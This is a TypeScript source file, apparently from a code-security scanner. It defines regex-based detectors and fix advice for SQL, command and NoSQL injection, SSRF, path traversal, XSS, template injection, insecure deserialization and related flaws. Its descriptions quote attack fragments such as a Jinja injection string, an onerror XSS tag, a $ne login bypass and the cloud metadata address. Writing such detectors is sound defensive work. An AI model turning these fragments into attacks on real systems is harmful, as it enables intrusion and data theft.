        finding(ctx, m.index, {
          ruleId: "test-without-assertion",
          category: "quality",
          severity: "medium",
          confidence: 0.65,
          description: `Test in ${ctx.short} contains no assertion. It passes as long as nothing throws, so it gives false confidence.`,
          label: "Tests without assertions",
          suggestion: "Assert on the behaviour under test: expect(result).toEqual(…), expect(spy).toHaveBeenCalledWith(…).",
        }),
      );
    }
    return out;
  },
};

const clientEnvCheck: StructuralCheck = {
  id: "server-env-in-client",
  langs: ["js"],
  run: (ctx) => {
    if (!ctx.isClient) return [];
    return [...ctx.code.matchAll(/\bprocess\s*\.\s*env\s*\.\s*(?!NEXT_PUBLIC_|NODE_ENV\b)([A-Z][A-Z0-9_]{2,})/g)].map((m) =>
      finding(ctx, m.index, {
        ruleId: "server-env-in-client",
        category: "security",
        severity: "medium",
        confidence: 0.75,
        description: `Client component ${ctx.short} reads server-only \`process.env.${m[1]}\`. Next.js only inlines NEXT_PUBLIC_ variables, so this is undefined in the browser — and if someone "fixes" it by adding the prefix, the secret ships to every visitor.`,
        suggestion: "Move the logic that needs this value into a server component, route handler or server action and pass only the result to the client.",
      }),
    );
  },
};

const jwtExpiryCheck: StructuralCheck = {
  id: "jwt-no-expiry",
  langs: ["js"],
  run: (ctx) => {
    const out: CheckFinding[] = [];
    for (const m of ctx.code.matchAll(/\bjwt\s*\.\s*sign\s*\(/g)) {
      const call = callArgsAt(ctx.code, m.index + m[0].length - 1);
      if (!call || call.args.length === 0) continue;
      const options = call.args[2]?.text ?? "";
      if (/\bexpiresIn\b/.test(options) || /\bexp\b/.test(call.args[0].text)) continue;
      out.push(
        finding(ctx, m.index, {
          ruleId: "jwt-no-expiry",
          cls: "auth",
          category: "security",
          severity: "high",
          confidence: 0.8,
          description: `JWT signed without an expiry in ${ctx.short}. A leaked token stays valid forever and can't be revoked without rotating the signing key.`,
          suggestion: "Always set expiresIn (e.g. \"15m\" for access tokens) and use refresh tokens for longer sessions.",
          fix: {
            before: "const token = jwt.sign({ userId }, secret);",
            after: 'const token = jwt.sign({ userId }, secret, { expiresIn: "15m", algorithm: "HS256" });',
            language: "typescript",
          },
        }),
      );
    }
    return out;
  },
};

export const STRUCTURAL_CHECKS: StructuralCheck[] = [
  routeAuthCheck,
  rateLimitCheck,
  serverActionAuthCheck,
  webhookCheck,
  cronCheck,
  paginationCheck,
  nPlusOneCheck,
  pyNPlusOneCheck,
  awaitInLoopCheck,
  asyncNoAwaitCheck,
  switchCheck,
  promiseCatchCheck,
  floatingPromiseCheck,
  missingKeyCheck,
  dockerRootCheck,
  actionsCheck,
  goDeferLoopCheck,
  testAssertionCheck,
  clientEnvCheck,
  jwtExpiryCheck,
];

function sqlish(call: { argsCode: string; argsText: string }, ctx: FileCtx): boolean {
  if (SQL_KEYWORDS.test(call.argsText)) return true;
  const ident = /^\s*([A-Za-z_$][\w$]*)\s*(?:,|$)/.exec(call.argsCode)?.[1];
  if (!ident) return false;
  const def = new RegExp(`\\b${ident.replace(/\$/g, "\\$")}\\s*(?::[^=\\n]+)?\\+?=(?!=)\\s*([^;]{0,600})`).exec(ctx.text);
  return !!def && SQL_KEYWORDS.test(def[1]);
}

const SQL_SUGGESTION =
  "Never build SQL from strings. Use parameterized queries (db.query(\"… WHERE id = $1\", [id]), cursor.execute(\"… %s\", (id,)), prisma.$queryRaw`…${id}`) or the ORM's query builder.";
const CMD_SUGGESTION =
  "Don't route user input through a shell. Call the program directly with an argument array (execFile / subprocess.run([...]) / exec.Command(prog, args...)), validate inputs against an allowlist, and put `--` before positional arguments.";
const SSRF_SUGGESTION =
  "Resolve the URL and check its host against an explicit allowlist before fetching; reject private/link-local IPs (169.254.169.254, 10/8, 127/8) and disable redirects or re-validate each hop.";
const PATH_SUGGESTION =
  "Resolve the path and verify it stays inside the intended base directory: const p = path.resolve(BASE, name); if (!p.startsWith(BASE + path.sep)) reject. Prefer mapping ids to files over accepting filenames.";
const REDIRECT_SUGGESTION =
  "Only redirect to relative paths you recognise (target.startsWith(\"/\") && !target.startsWith(\"//\")) or to an allowlist of hosts; fall back to a safe default.";
const XSS_SUGGESTION =
  "Render user content as text (textContent / React children), or sanitize HTML with DOMPurify/bleach/sanitize-html before inserting it.";

export const TAINT_SINKS: SinkRule[] = [
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["js"], kind: "call", args: "first",
    pattern: /\$(?:queryRawUnsafe|executeRawUnsafe)\s*\(|\.\s*(?:whereRaw|orderByRaw|havingRaw|joinRaw|fromRaw|raw|unsafe)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "SQL injection",
    impact: "The value is spliced into raw SQL, so an attacker can read, modify or delete arbitrary data.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["js"], kind: "call", args: "first", when: sqlish,
    pattern: /\.\s*(?:query|execute|run|all|prepare)\s*\(/g,
    severity: "critical", confidence: 0.85, title: "SQL injection",
    impact: "The value becomes part of the SQL text, so an attacker can rewrite the query.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["py"], kind: "call", args: "first",
    pattern: /\.\s*(?:execute|executemany|executescript|raw|extra|from_statement)\s*\(|(?<![.\w])text\s*\(/g,
    severity: "critical", confidence: 0.85, title: "SQL injection",
    impact: "The value is formatted into the SQL string instead of being passed as a bound parameter.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["go"], kind: "call", args: "query",
    pattern: /\.\s*(?:Query|QueryRow|Exec|QueryContext|ExecContext|QueryRowContext|Prepare|PrepareContext)\s*\(/g,
    severity: "critical", confidence: 0.85, title: "SQL injection",
    impact: "The value is part of the query string rather than a placeholder argument.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["java", "cs"], kind: "call", args: "first",
    pattern: /\.\s*(?:executeQuery|executeUpdate|execute|prepareStatement|createQuery|createNativeQuery|addBatch|FromSqlRaw|ExecuteSqlRaw)\s*\(|\bnew\s+SqlCommand\s*\(/g,
    severity: "critical", confidence: 0.85, title: "SQL injection",
    impact: "The value is concatenated into SQL text.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["php"], kind: "call", args: "all",
    pattern: /\b(?:mysqli_query|mysql_query|pg_query)\s*\(|->\s*(?:query|exec)\s*\(/g,
    severity: "critical", confidence: 0.85, title: "SQL injection",
    impact: "Request data is interpolated into the SQL string.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-sql-injection", cls: "sqli", langs: ["rb"], kind: "call", args: "first",
    when: (c) => /^\s*"[^"]*#\{/.test(c.argsText),
    pattern: /\.\s*(?:where|find_by_sql|order|group|having|joins|select|pluck|update_all|delete_all|exists\?)\s*\(/g,
    severity: "critical", confidence: 0.85, title: "SQL injection",
    impact: "Params are interpolated into an SQL fragment.",
    suggestion: SQL_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["js"], kind: "call", args: "first",
    pattern: /(?:(?<![.\w$])|\b(?:child_process|childProcess|cp)\s*\.\s*)(?:exec|execSync)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Command injection",
    impact: "exec() runs the string through /bin/sh, so metacharacters in the input execute arbitrary commands on the server.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["js"], kind: "call", args: "all",
    when: (c) => /\bshell\s*:\s*true\b/.test(c.argsCode),
    pattern: /(?:(?<![.\w$])|\b(?:child_process|childProcess|cp)\s*\.\s*)(?:spawn|spawnSync|execFile|execFileSync)\s*\(|\bexeca\w*\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Command injection",
    impact: "With shell: true the arguments are re-parsed by a shell.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["js"], kind: "call", args: "first",
    pattern: /(?:(?<![.\w$])|\b(?:child_process|childProcess|cp)\s*\.\s*)(?:spawn|spawnSync|execFile|execFileSync)\s*\(|\bexeca\w*\s*\(/g,
    severity: "high", confidence: 0.8, title: "Command injection",
    impact: "User input chooses which program is executed.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["py"], kind: "call", args: "first",
    pattern: /\bos\s*\.\s*(?:system|popen)\s*\(|\bsubprocess\s*\.\s*(?:getoutput|getstatusoutput)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Command injection",
    impact: "The string is executed by the shell.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["py"], kind: "call", args: "all",
    when: (c) => /\bshell\s*=\s*True\b/.test(c.argsCode),
    pattern: /\bsubprocess\s*\.\s*(?:run|call|check_call|check_output|Popen)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Command injection",
    impact: "shell=True re-parses the command line through /bin/sh.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["go"], kind: "call", args: "all",
    pattern: /\bexec\s*\.\s*Command(?:Context)?\s*\(/g,
    severity: "high", confidence: 0.8, title: "Command injection",
    impact: "Request data flows into the executed command or its arguments.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["java"], kind: "call", args: "all",
    pattern: /\bRuntime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(|\bnew\s+ProcessBuilder\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Command injection",
    impact: "Request data reaches the process command line.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["php"], kind: "call", args: "first",
    pattern: /\b(?:system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Command injection",
    impact: "Request data is executed by the shell.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-command-injection", cls: "cmdi", langs: ["rb"], kind: "call", args: "first",
    pattern: /(?<![.\w])(?:system|exec|spawn)\s*\(|\bIO\s*\.\s*popen\s*\(|\bOpen3\s*\.\s*\w+\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Command injection",
    impact: "Params reach a shell command.",
    suggestion: CMD_SUGGESTION,
  },
  {
    id: "taint-code-execution", cls: "code", langs: ["js"], kind: "call", args: "first",
    pattern: /(?<![.\w$])eval\s*\(|\bnew\s+Function\s*\(|\bvm\s*\.\s*(?:runInNewContext|runInThisContext|runInContext|compileFunction)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Remote code execution",
    impact: "The input is executed as JavaScript with full server/page privileges.",
    suggestion: "Never evaluate user input. Parse data with JSON.parse and dispatch behaviour through an explicit lookup table.",
  },
  {
    id: "taint-code-execution", cls: "code", langs: ["py"], kind: "call", args: "first",
    pattern: /(?<![.\w])(?:eval|exec)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Remote code execution",
    impact: "The input is executed as Python.",
    suggestion: "Use ast.literal_eval for literals and explicit dispatch for behaviour.",
  },
  {
    id: "taint-code-execution", cls: "code", langs: ["php"], kind: "call", args: "first",
    pattern: /\b(?:eval|assert|create_function)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Remote code execution",
    impact: "Request data is evaluated as PHP.",
    suggestion: "Remove dynamic evaluation entirely.",
  },
  {
    id: "taint-code-execution", cls: "code", langs: ["rb"], kind: "call", args: "first",
    pattern: /(?<![.\w])(?:eval|instance_eval|class_eval|module_eval)\s*\(|\.\s*(?:send|public_send)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Dynamic code execution",
    impact: "Params decide which code runs.",
    suggestion: "Map allowed values to behaviour explicitly.",
  },
  {
    id: "taint-ssrf", cls: "ssrf", langs: ["js"], kind: "call", args: "first", prefixOnly: true, guard: "strong", skipClient: true,
    pattern: /(?<![.\w$])fetch\s*\(|\baxios(?:\s*\.\s*(?:get|post|put|delete|patch|head|request))?\s*\(|\bgot(?:\s*\.\s*(?:get|post|put|delete|patch|stream))?\s*\(|\b(?:http|https)\s*\.\s*(?:get|request)\s*\(|\bky(?:\s*\.\s*(?:get|post|put|delete|patch))?\s*\(|\bundici\s*\.\s*(?:request|fetch)\s*\(|\bneedle\s*\(/g,
    severity: "high", confidence: 0.8, title: "Server-side request forgery (SSRF)",
    impact: "The client controls which host the server connects to — internal services, cloud metadata (169.254.169.254) and localhost admin ports become reachable.",
    suggestion: SSRF_SUGGESTION,
  },
  {
    id: "taint-ssrf", cls: "ssrf", langs: ["py"], kind: "call", args: "first", prefixOnly: true, guard: "strong",
    pattern: /\brequests\s*\.\s*(?:get|post|put|delete|patch|head|request)\s*\(|\bhttpx\s*\.\s*(?:get|post|put|delete|patch|request|stream)\s*\(|\burllib\s*\.\s*request\s*\.\s*urlopen\s*\(|(?<![.\w])urlopen\s*\(/g,
    severity: "high", confidence: 0.8, title: "Server-side request forgery (SSRF)",
    impact: "The client controls the destination host of a server-side request.",
    suggestion: SSRF_SUGGESTION,
  },
  {
    id: "taint-ssrf", cls: "ssrf", langs: ["go"], kind: "call", args: "first", prefixOnly: true, guard: "strong",
    pattern: /\bhttp\s*\.\s*(?:Get|Post|Head|PostForm)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Server-side request forgery (SSRF)",
    impact: "The client controls the destination host.",
    suggestion: SSRF_SUGGESTION,
  },
  {
    id: "taint-ssrf", cls: "ssrf", langs: ["go"], kind: "call", args: [1], prefixOnly: true, guard: "strong",
    pattern: /\bhttp\s*\.\s*NewRequest\s*\(/g,
    severity: "high", confidence: 0.8, title: "Server-side request forgery (SSRF)",
    impact: "The client controls the destination host.",
    suggestion: SSRF_SUGGESTION,
  },
  {
    id: "taint-ssrf", cls: "ssrf", langs: ["go"], kind: "call", args: [2], prefixOnly: true, guard: "strong",
    pattern: /\bhttp\s*\.\s*NewRequestWithContext\s*\(/g,
    severity: "high", confidence: 0.8, title: "Server-side request forgery (SSRF)",
    impact: "The client controls the destination host.",
    suggestion: SSRF_SUGGESTION,
  },
  {
    id: "taint-ssrf", cls: "ssrf", langs: ["java", "php"], kind: "call", args: "first", prefixOnly: true, guard: "strong",
    pattern: /\bnew\s+URL\s*\(|\b(?:file_get_contents|fopen|curl_init)\s*\(/g,
    severity: "high", confidence: 0.75, title: "Server-side request forgery (SSRF)",
    impact: "Request data selects the URL or file the server opens.",
    suggestion: SSRF_SUGGESTION,
  },
  {
    id: "taint-path-traversal", cls: "path", langs: ["js"], kind: "call", args: "first", guard: "strong",
    pattern: /(?:(?<![.\w$])|\b(?:fs|fsp|promises|fs\s*\.\s*promises)\s*\.\s*)(?:readFile|readFileSync|writeFile|writeFileSync|appendFile|appendFileSync|createReadStream|createWriteStream|unlink|unlinkSync|readdir|readdirSync|rm|rmSync|copyFile|rename)\s*\(|\bres\s*\.\s*(?:sendFile|download)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Path traversal",
    impact: "`../` sequences let the caller read or overwrite files outside the intended directory (.env, keys, source).",
    suggestion: PATH_SUGGESTION,
  },
  {
    id: "taint-path-traversal", cls: "path", langs: ["py"], kind: "call", args: "first", guard: "strong",
    pattern: /(?<![.\w])open\s*\(|\bsend_file\s*\(|\bos\s*\.\s*(?:remove|unlink|rmdir|listdir)\s*\(|\bshutil\s*\.\s*(?:rmtree|copy\w*|move)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Path traversal",
    impact: "`../` in the input escapes the intended directory.",
    suggestion: PATH_SUGGESTION,
  },
  {
    id: "taint-path-traversal", cls: "path", langs: ["go"], kind: "call", args: "first", guard: "strong",
    pattern: /\bos\s*\.\s*(?:Open|OpenFile|ReadFile|WriteFile|Remove|RemoveAll|Create|ReadDir)\s*\(|\bioutil\s*\.\s*(?:ReadFile|WriteFile|ReadDir)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Path traversal",
    impact: "`../` in the input escapes the intended directory.",
    suggestion: PATH_SUGGESTION,
  },
  {
    id: "taint-path-traversal", cls: "path", langs: ["java"], kind: "call", args: "all", guard: "strong",
    pattern: /\bnew\s+(?:File|FileInputStream|FileOutputStream|FileReader|FileWriter|RandomAccessFile)\s*\(|\bPaths\s*\.\s*get\s*\(|\bPath\s*\.\s*of\s*\(/g,
    severity: "high", confidence: 0.8, title: "Path traversal",
    impact: "Request data is used to build a filesystem path.",
    suggestion: PATH_SUGGESTION,
  },
  {
    id: "taint-file-inclusion", cls: "lfi", langs: ["php"], kind: "expr",
    pattern: /\b(?:include|include_once|require|require_once)\b/g,
    severity: "critical", confidence: 0.85, title: "File inclusion",
    impact: "Request data chooses which PHP file is executed.",
    suggestion: "Map user choices to a fixed allowlist of templates.",
  },
  {
    id: "taint-open-redirect", cls: "redirect", langs: ["js"], kind: "call", args: "last", prefixOnly: true, guard: "strong",
    pattern: /\bres\s*\.\s*redirect\s*\(/g,
    severity: "medium", confidence: 0.75, title: "Open redirect",
    impact: "Attackers can craft links on your domain that bounce victims to a phishing site (and steal OAuth codes).",
    suggestion: REDIRECT_SUGGESTION,
  },
  {
    id: "taint-open-redirect", cls: "redirect", langs: ["js"], kind: "call", args: "first", prefixOnly: true, guard: "strong",
    pattern: /\b(?:NextResponse|Response)\s*\.\s*redirect\s*\(|(?<![.\w$])(?:redirect|permanentRedirect)\s*\(|\blocation\s*\.\s*(?:assign|replace)\s*\(|\brouter\s*\.\s*(?:push|replace)\s*\(|\bwindow\s*\.\s*open\s*\(/g,
    severity: "medium", confidence: 0.75, title: "Open redirect",
    impact: "Attackers can craft links on your domain that bounce victims to a phishing site.",
    suggestion: REDIRECT_SUGGESTION,
  },
  {
    id: "taint-open-redirect", cls: "redirect", langs: ["js"], kind: "assign", prefixOnly: true, guard: "strong",
    pattern: /\b(?:window\s*\.\s*)?location(?:\s*\.\s*href)?\s*=(?!=)/g,
    severity: "medium", confidence: 0.75, title: "Open redirect",
    impact: "The page navigates wherever the URL parameter says — including javascript: URLs (XSS).",
    suggestion: REDIRECT_SUGGESTION,
  },
  {
    id: "taint-open-redirect", cls: "redirect", langs: ["py"], kind: "call", args: "first", prefixOnly: true, guard: "strong",
    pattern: /(?<![.\w])redirect\s*\(|\bHttpResponseRedirect\s*\(/g,
    severity: "medium", confidence: 0.75, title: "Open redirect",
    impact: "Attackers can craft links that redirect victims off-site.",
    suggestion: "Validate with url_has_allowed_host_and_scheme() (Django) or allow only relative paths.",
  },
  {
    id: "taint-open-redirect", cls: "redirect", langs: ["go"], kind: "call", args: [2], prefixOnly: true, guard: "strong",
    pattern: /\bhttp\s*\.\s*Redirect\s*\(/g,
    severity: "medium", confidence: 0.75, title: "Open redirect",
    impact: "Attackers can craft links that redirect victims off-site.",
    suggestion: REDIRECT_SUGGESTION,
  },
  {
    id: "taint-xss", cls: "xss", langs: ["js"], kind: "assign",
    pattern: /\.\s*(?:innerHTML|outerHTML)\s*=(?!=)/g,
    severity: "high", confidence: 0.85, title: "Cross-site scripting (XSS)",
    impact: "Markup from the input is parsed as HTML, so <img onerror=…> runs script in the victim's session.",
    suggestion: XSS_SUGGESTION,
  },
  {
    id: "taint-xss", cls: "xss", langs: ["js"], kind: "call", args: "all",
    pattern: /\bdocument\s*\.\s*write(?:ln)?\s*\(|\.\s*insertAdjacentHTML\s*\(|\$\s*\([^)]*\)\s*\.\s*(?:html|append|prepend|after|before)\s*\(/g,
    severity: "high", confidence: 0.85, title: "Cross-site scripting (XSS)",
    impact: "The input is inserted as HTML.",
    suggestion: XSS_SUGGESTION,
  },
  {
    id: "taint-xss", cls: "xss", langs: ["js"], kind: "expr",
    pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:/g,
    severity: "high", confidence: 0.85, title: "Cross-site scripting (XSS)",
    impact: "User-controlled HTML is rendered without escaping.",
    suggestion: XSS_SUGGESTION,
  },
  {
    id: "taint-xss", cls: "xss", langs: ["js"], kind: "call", args: "first",
    when: (c) => /<[a-zA-Z]/.test(c.argsText),
    pattern: /\bres\s*\.\s*(?:send|write|end)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Reflected XSS",
    impact: "Request data is written into an HTML response without escaping.",
    suggestion: "Escape values for HTML before writing them, or render through a template engine with auto-escaping.",
  },
  {
    id: "taint-xss", cls: "xss", langs: ["py"], kind: "call", args: "first",
    pattern: /\b(?:Markup|mark_safe|SafeString)\s*\(/g,
    severity: "high", confidence: 0.85, title: "Cross-site scripting (XSS)",
    impact: "User input is marked safe and bypasses template auto-escaping.",
    suggestion: XSS_SUGGESTION,
  },
  {
    id: "taint-xss", cls: "xss", langs: ["go"], kind: "call", args: "first",
    pattern: /\btemplate\s*\.\s*(?:HTML|JS|URL|HTMLAttr)\s*\(/g,
    severity: "high", confidence: 0.85, title: "Cross-site scripting (XSS)",
    impact: "Request data is converted to a trusted template type, disabling html/template escaping.",
    suggestion: "Pass plain strings to html/template and let it escape them.",
  },
  {
    id: "taint-xss", cls: "xss", langs: ["java"], kind: "call", args: "first",
    pattern: /\bgetWriter\s*\(\s*\)\s*\.\s*(?:print|println|write|append)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Reflected XSS",
    impact: "Request data is written to the response unescaped.",
    suggestion: "Encode output with OWASP Java Encoder (Encode.forHtml) or a template engine.",
  },
  {
    id: "taint-xss", cls: "xss", langs: ["php"], kind: "expr",
    pattern: /\b(?:echo|print)\b/g,
    severity: "high", confidence: 0.8, title: "Reflected XSS",
    impact: "Request data is echoed without escaping.",
    suggestion: "Escape with htmlspecialchars($v, ENT_QUOTES, 'UTF-8').",
  },
  {
    id: "taint-redos", cls: "redos", langs: ["js"], kind: "call", args: "first", skipClient: true,
    pattern: /\bnew\s+RegExp\s*\(|(?<![.\w$])RegExp\s*\(/g,
    when: (call, ctx) => !isDiscardedExpression(ctx.code, call.start, call.end),
    severity: "medium", confidence: 0.8, title: "Regular-expression injection (ReDoS)",
    impact: "Callers supply the pattern itself — a catastrophic-backtracking pattern pins the CPU and blocks the event loop.",
    suggestion: "Escape the input before building a RegExp (input.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\")) or use string methods like includes().",
  },
  {
    id: "taint-redos", cls: "redos", langs: ["py"], kind: "call", args: "first",
    pattern: /\bre\s*\.\s*(?:compile|match|search|fullmatch|findall|finditer|sub|subn|split)\s*\(/g,
    severity: "medium", confidence: 0.75, title: "Regular-expression injection (ReDoS)",
    impact: "Callers supply the regex pattern.",
    suggestion: "Wrap user input in re.escape() before using it in a pattern.",
  },
  {
    id: "taint-template-injection", cls: "ssti", langs: ["js"], kind: "call", args: "first",
    pattern: /\b(?:ejs|pug|handlebars|Handlebars|nunjucks|mustache|Mustache|lodash|doT)\s*\.\s*(?:render|compile|renderString|template)\s*\(|\b_\s*\.\s*template\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Server-side template injection",
    impact: "The input is compiled as a template, which executes code on the server.",
    suggestion: "Keep templates static and pass user input only as data: render(TEMPLATE, { name }).",
  },
  {
    id: "taint-template-injection", cls: "ssti", langs: ["py"], kind: "call", args: "first",
    pattern: /\brender_template_string\s*\(|\bjinja2\s*\.\s*Template\s*\(|\.\s*from_string\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Server-side template injection",
    impact: "The input is compiled as a Jinja template ({{ ''.__class__.__mro__… }} → RCE).",
    suggestion: "Use render_template with a static template file and pass input as variables.",
  },
  {
    id: "taint-deserialization", cls: "deser", langs: ["js"], kind: "call", args: "first",
    pattern: /(?<![.\w$])unserialize\s*\(|\bserialize\s*\.\s*unserialize\s*\(|\bv8\s*\.\s*deserialize\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Insecure deserialization",
    impact: "Serialized payloads can carry functions that execute on deserialization.",
    suggestion: "Use JSON.parse with schema validation.",
  },
  {
    id: "taint-deserialization", cls: "deser", langs: ["py"], kind: "call", args: "first",
    when: (c) => !/SafeLoader|CSafeLoader/.test(c.argsCode),
    pattern: /\b(?:pickle|cPickle|dill|marshal|jsonpickle)\s*\.\s*(?:loads?|decode)\s*\(|\byaml\s*\.\s*(?:unsafe_load|load|full_load)\s*\(/g,
    severity: "critical", confidence: 0.9, title: "Insecure deserialization",
    impact: "Request bytes are deserialized into arbitrary objects — remote code execution.",
    suggestion: "Accept JSON and validate it; never unpickle client data.",
  },
  {
    id: "taint-deserialization", cls: "deser", langs: ["php", "rb"], kind: "call", args: "first",
    pattern: /\bunserialize\s*\(|\b(?:Marshal|YAML|Psych)\s*\.\s*(?:load|unsafe_load|restore)\s*\(/g,
    severity: "critical", confidence: 0.85, title: "Insecure deserialization",
    impact: "Request data is deserialized into objects (object injection → RCE).",
    suggestion: "Use JSON.",
  },
  {
    id: "taint-nosql-injection", cls: "nosqli", langs: ["js"], kind: "call", args: "first",
    when: (c, ctx) => /^\s*\{/.test(c.argsCode) && /mongoose|mongodb|\.collection\s*\(/.test(ctx.text),
    pattern: /\.\s*(?:find|findOne|findOneAndUpdate|findOneAndDelete|findOneAndReplace|updateOne|updateMany|deleteOne|deleteMany|countDocuments)\s*\(/g,
    severity: "high", confidence: 0.75, title: "NoSQL operator injection",
    impact: "If the client sends an object ({\"$ne\": null}) instead of a string, it becomes a query operator — classic login bypass.",
    suggestion: "Validate types before querying (z.string()), or cast explicitly: { email: String(email) }. express-mongo-sanitize strips $-operators globally.",
  },
  {
    id: "taint-mass-assignment", cls: "mass-assign", langs: ["js"], kind: "call", args: "first",
    extract: (arg) => /\bdata\s*:\s*(?:\{\s*\.\.\.\s*)?([A-Za-z_$][\w$]*(?:\s*\.\s*(?:body|query|params))?)\s*[,}\n]/.exec(arg)?.[1] ?? null,
    pattern: /\.\s*(?:create|createMany|update|updateMany|upsert)\s*\(/g,
    severity: "high", confidence: 0.8, title: "Mass assignment",
    impact: "The whole request object is written to the database, so clients can set fields they shouldn't (role, isAdmin, ownerId, credits).",
    suggestion: "Parse the body with a schema that lists the writable fields (zod strips unknown keys by default) and pass only those: data: { name: body.name }.",
    fix: {
      before: "const body = await req.json();\nawait prisma.user.update({ where: { id }, data: body });",
      after: "const body = UpdateProfile.parse(await req.json()); // z.object({ name, bio })\nawait prisma.user.update({ where: { id: session.user.id }, data: body });",
      language: "typescript",
    },
  },
];
